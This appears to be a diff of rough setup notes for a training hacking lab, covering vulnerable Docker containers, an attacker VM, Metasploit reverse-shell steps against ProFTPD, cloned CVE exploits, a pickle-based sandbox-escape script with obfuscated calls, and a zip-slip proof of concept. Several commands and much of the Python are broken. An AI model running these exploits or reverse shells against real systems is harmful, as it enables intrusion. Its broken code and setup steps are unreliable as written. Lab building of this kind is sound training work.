@@ -1,0 +1,281 @@
+# Proftp: The Proftp docker vm: https://github.com/t0kx/exploit-CVE-2015-3306.git
+
+# solution to proftp with apache
+metasploit: 
+use unix/ftp/proftp_modecopy_exec
+set sitepath /var/www/html
+show payloads
+set payload cmd/unix/reverse_perl 
+# after running you get cmd.
+# then the attacker needs to use curl to download msvenum payload.
+
+# Create proftp:
+container_name=proftp_with_apache_$1
+docker build -t vuln/cve-2015-3306 .
+docker run --rm -idt --name $container_name vuln/cve-2015-3306
+docker cp ./installations.sh $container_name:/home/installations.sh
+docker exec -it $container_name sh installations.sh
+
+
+# =========================================================================================
+
+# The Attacker VM:
+# Add atacker user
+
+cd /home/attacker
+apt upadte
+apt install -y python2 python3 python3-pip nmap xxd net-tools gcc wget curl iputils-ping vim php openssh-server tcpdump netcat apache2 tree
+service apache2 start
+service ssh start
+curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py
+python2 get-pip.py
+python2 -m pip install requests flask flask-cors
+pip3 install requests flask flask-cors
+
+# Cheatsheets
+mkdir Cheatsheets
+cd Cheatsheets
+
+	# Something about how to use python requests.
+	# python3; import requests; help(requests)
+
+	# Something about apache.
+	mkdir apache2
+	cd apache2
+	wget -E -H -k -K -p "https://httpd.apache.org/docs/2.4/getting-started.html" 
+	cd ..
+
+	# Something about Flask
+
+	# Metasploit
+	mkdir metasploit
+	cd metasploit
+	wget -E -H -k -K -p "https://www.tutorialspoint.com/metasploit/metasploit_quick_guide.htm" 
+
+	wget -E -H -k -K -p "https://www.tutorialspoint.com/metasploit/metasploit_quick_guide.htm" 
+
+	wget -E -H -k -K -p "https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/"
+
+	cd ..
+
+	# Meterpreter from php shell
+	mkdir php_webshell_to_meterpreter
+	cd php_webshell_to_meterpreter
+	wget -E -H -k -K -p "https://www.hackingarticles.in/webshell-to-meterpreter/"
+	cd ..
+
+	# Nmap
+	mkdir nmap
+	cd nmap
+	wget -E -H -k -K -p "https://www.stationx.net/nmap-cheat-sheet/"
+	cd ..
+
+
+	# msfvenum
+	mkdir msfvenum
+	cd msfvenum
+	wget -E -H -k -K -p "https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/"
+	cd ..
+
+	# Hashcat
+
+	# hydra
+	mkdir hydra
+	cd hydra
+	wget -E -H -k -K -p "https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/"
+	cd ..
+
+	# gobuster from red team toturials.
+
+# Other tools
+cd /home/attacker
+mkdir tools
+cd tools
+
+	# The php webshell
+	git clone https://github.com/WhiteWinterWolf/wwwolf-php-webshell.git
+
+	# Metasploit installer
+	mkdir metasploit_installer
+	cd metasploit_installer
+	curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+	chmod +x msfinstall
+	sudo ./msfinstall
+
+	# Hashcat
+	apt install -y hashcat
+
+	# Hydra
+	apt-get install -y hydra hydra-gtk
+
+	# Web Tools
+	# sqlmap
+	# wpscan
+	# joomscan
+	# urlfuzzer
+
+	# Word lists for brute forcing.
+
+	# Beef installation:
+	git clone https://github.com/beefproject/beef.git
+	cd beef
+	apt upadte
+	apt-get clean && apt-get update && apt-get install -y locals
+	echo "LC_ALL=en_US.UTF-8" >> /etc/enviroment
+	echo "en_US.UTF-8" >> /etc/local.gem
+	echo "LANG=en_US.UTF-8" > /etc/local.conf
+	local-gen en_US.UTF-8
+	# inside ./install replace all sudo with nothing
+	python3 -c "x = open('./install', 'r').read(); x.close(); open('./install', 'w').write(data.replace('sudo ', ''))" 
+	chmod +x ./install
+	./install
+	# Should set time to new york
+	# need to change the username and password.
+	# ./beef
+	cd ..
+
+# Exploits
+cd /home/attacker
+mkdir exploits
+cd exploits
+	
+	# The ssh vulnerability.
+	pip3 install paramiko==2.0.8
+	git clone https://github.com/blacknbunny/CVE-2018-10933.git
+
+	# The proftp vulnerability
+	git clone https://github.com/t0kx/exploit-CVE-2015-3306.git
+	rm -rf exploit-CVE-2015-3306/Dockerfile
+	git clone https://github.com/thegingerninja/ProFTPd_1_3_5_mod_copy_exploit.git
+	# In metasploit:
+	# set payload cmd/unix/reverse_python
+
+	# The phpmail vulnerability.
+	git clone https://github.com/opsxcq/exploit-CVE-2016-10033.git
+
+	# The sambacry exploit
+	git clone https://github.com/opsxcq/exploit-CVE-2017-7494.git
+
+	# The zip slip vulnerability
+	git clone https://github.com/cesarsotovalero/zip-slip-exploit-example.git
+
+# =========================================================================================
+
+# Create attacker:
+container_name=attcker_$1
+docker run --rm -idt --name $container_name ubuntu
+docker cp ./installations.sh $container_name:/home/installations.sh
+docker exec -it $container_name sh installations.sh
+
+# =========================================================================================
+
+# Sanbox escape challenge solution
+import pickle
+import requests
+from asd import hi
+import base64
+url = "http://127.0.0.1:5000/submit_form"
+
+def send(payload):
+	data = {"calculation_to_preform": "payload"}
+	x = requests.post(url, data=data)
+	print(x.text)
+
+def generate_pickle_payload()
+	return pickle.dumps(hi)
+
+def write_file(data):
+	with open("asd.py", "r") as fp:
+		data = fp.read()
+		payload = 'open("/path/to/dockerexercise/asd.py", "w").__getattribute__("etriw"[::-1])({})'.format(base64.b64encode(data))
+		# Now send the pickle file.
+
+def execute_payload():
+	pickle_payload = generate_pickle_payload()
+	print(pickle_payload)
+	payload = "pickle.loads({})()".format(pickle_payload)
+	send(payload)
+
+def turn_to_whitebox():
+	payload = 'open("path/to/server.py", "r").__getattribute__("daer"[::-1])()'
+	send(payload)
+
+def main():
+	write_file()
+	execute_payload()
+
+if __name__ == "__main__":
+	main()
+
+# =========================================================================================
+
+apt update 
+apt install -y python3 python3-pip
+pip3 intsall flask flask_cors
+
+# =========================================================================================
+
+# This will create the python sandbox container
+container_name=python_sandbox_$1
+docker run --rm -idt --name $container_name ubuntu
+docker cp ./installations.sh $container_name:/home/installations.sh
+docker exec -it $container_name sh installations.sh
+
+# =========================================================================================
+
+python3 -c "print('123\n123')" | passwd
+python3 -c "print('123\n123')" | adduser moses
+usermode -aG sudo moses
+service ssh start
+ifconfig
+
+# =========================================================================================
+
+# This is the first webserver challenge
+# The phpmailer version is 5.2.17
+apt update
+# in the apache installation you need to insert the timezone
+apt install -y net-tools apache2 php 
+# Create the ssh keys - openssl req -x509-newkey rsa:4096 -nodes -out ssl_cert.crt -keyout ssl_key.key -subj "/C=US/ST=Utah/L=Lehi/)=Bamba Corp./OU=IT/CN=bamba.com" -days 1000
+<VirtualHost *:443>
+    DocumentRoot /var/www/html
+    ServerName www.bamba.com
+    SSLEngine on
+    SSLCertificateFile /path/to/your_domain_name.crt
+    SSLCertificateKeyFile /path/to/your_private.key
+</VirtualHost>	
+
+# =========================================================================================
+
+# Zip slip python poc code
+import tarfile
+tf = tarfile.TarFile("zip-slip.tar")
+tf.list()
+tf.extractall()
+
+# =========================================================================================
+
+# This will create the zip slip container
+container_name=zip_slip_$1
+docker run --rm -idt --name $container_name ubuntu
+docker cp ./installations.sh $container_name:/home/installations.sh
+docker exec -it $container_name sh installations.sh
+
+# =========================================================================================
+
+# installations.sh for zip slip vulnerability.
+cd /home/fileserver
+apt update
+apt install -y curl tar
+
+curl -O https://www.python.org/ftp/python/3.6.0/Python-3.6.0.tgz
+tar -xvzf Python-3.6.0.tgz
+cd Python-3.6.0
+./configure
+make
+sudo make install
+
+# =========================================================================================
+# =========================================================================================
+# =========================================================================================
+
